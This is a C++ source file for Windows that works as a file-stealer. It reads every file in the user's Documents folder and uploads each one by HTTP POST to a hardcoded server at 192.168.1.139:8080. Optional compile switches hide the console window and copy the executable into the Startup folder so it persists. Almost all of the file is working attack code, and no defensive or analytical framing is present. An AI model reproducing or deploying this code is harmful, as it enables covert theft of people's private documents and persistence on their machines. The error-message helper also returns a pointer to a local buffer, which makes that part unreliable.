#pragma comment(lib, "ws2_32.lib")

#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <string>
#include <iostream>
#include <filesystem>
#include <fstream>


namespace fs = std::filesystem;

#define susBehaviour false
#define stealthBehaviour false

#define SERV_PORT 8080 // The port the HTTP POST request will be sent to
const char szHost[] = "192.168.1.139";

// Function to generate a user-friendly error message based on the error code
const char* FormatErrorMessage(DWORD errorCode){
	// Use the FormatMessage function to generate the error message
	char errorMessage[1024];
	FormatMessage(
		FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errorCode,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		errorMessage,
		sizeof(errorMessage),
		NULL
	);
	// Return the error message
	return errorMessage;
}

void sendFile(std::string path, std::string fileName) {
	// Initialize Winsock
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return;
	}
	// Create a socket
	SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return;
	}
	// Resolve the server address and port
	struct sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(szHost);
	clientService.sin_port = htons(SERV_PORT);
	// Connect to server.
	iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
	if (iResult == SOCKET_ERROR) {
		printf("connect failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return;
	}
	// Load the file from the disk
	std::ifstream in(path, std::ios::binary);
	if (!in) {
		printf("Failed to open file %s for reading\n", path.c_str());
		return;
	}
	// Get the file size
	in.seekg(0, std::ios::end);
	int fileSize = in.tellg();
	in.seekg(0, std::ios::beg);
	// Allocate memory for the file
	char* fileBuffer = new char[fileSize];
	// Read the file into memory
	in.read(fileBuffer, fileSize);
	in.close();
	// Assemble a HTTP POST request
	// FORMAT:
	/*
		POST / HTTP/1.1
		Host: localhost:8080
		Content-Type: multipart/form-data; boundary=MY_BOUNDARY

		--MY_BOUNDARY
		Content-Disposition: form-data; name="file"; filename="myfile.txt"

		[file data]
		--MY_BOUNDARY--
	*/
	std::string request = "POST / HTTP/1.1\r\n";
	request += "Host: " + std::string(szHost) + ":" + std::to_string(SERV_PORT) + "\r\n";
	request += "Content-Type: multipart/form-data; boundary=MY_BOUNDARY\r\n\r\n";
	request += "--MY_BOUNDARY\r\n";
	request += "Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n\r\n";
	request += std::string(fileBuffer, fileSize);
	request += "\r\n--MY_BOUNDARY--\r\n";
	std::cout << request << std::endl;
	// Send the HTTP POST request
	iResult = send(ConnectSocket, request.c_str(), request.length(), 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return;
	}
	// Receive the HTTP response
	/*
	char recvbuf[1024];
	iResult = recv(ConnectSocket, recvbuf, 1024, 0);
	if (iResult > 0) {
		printf("Response: %s\n", recvbuf);
	}
	else if (iResult == 0) {
		printf("Connection closed\n");
	}
	else {
		printf("recv failed with error: %d\n", WSAGetLastError());
	}
	*/
	// Cleanup
	closesocket(ConnectSocket);
	WSACleanup();
}



int main() {
#if stealthBehaviour
	ShowWindow(GetConsoleWindow(), SW_HIDE); // Stealth mode activated!
#endif // stealthBehaviour
#if susBehaviour
	// Get the path to the user's startup folder
	char szStartupPath[MAX_PATH] = { 0 };
	if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
		#if !stealthBehaviour
		DWORD errorCode = GetLastError();
		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
		#endif
	}
	// Get the path to the current executable
	char szExecPath[MAX_PATH] = { 0 };
	if (!SUCCEEDED(GetModuleFileName(NULL, szExecPath, MAX_PATH))) {
		#if !stealthBehaviour
		DWORD errorCode = GetLastError();
		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
		#endif
	}
	// Copy the executable to the startup folder
	// - First, create a string with the new path of the new file
	const char szStartupExecName[] = "a.exe";
	char szStartupExecPath[MAX_PATH];
	sprintf(szStartupExecPath, "%s\\%s", szStartupPath, szStartupExecName);
	if (!SUCCEEDED(CopyFile(szExecPath, szStartupExecPath, NULL))) {
		#if !stealthBehaviour
		DWORD errorCode = GetLastError();
		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
		#endif
	}
	#if !stealthBehaviour
	printf("%s | %s\n", szStartupExecPath, szExecPath);
	#endif
#endif // susBehaviour

	fs::path desktopPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Desktop");
	fs::path downloadsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Downloads");
	fs::path picturesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Pictures");
	fs::path documentsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Documents");
	// Iterate through files
	for (const auto& entry : fs::directory_iterator(documentsPath)) {
		std::cout << entry.path() << std::endl;
		sendFile(entry.path().string(), entry.path().filename().string());
	}

	getchar();
	ExitProcess(EXIT_SUCCESS);
}
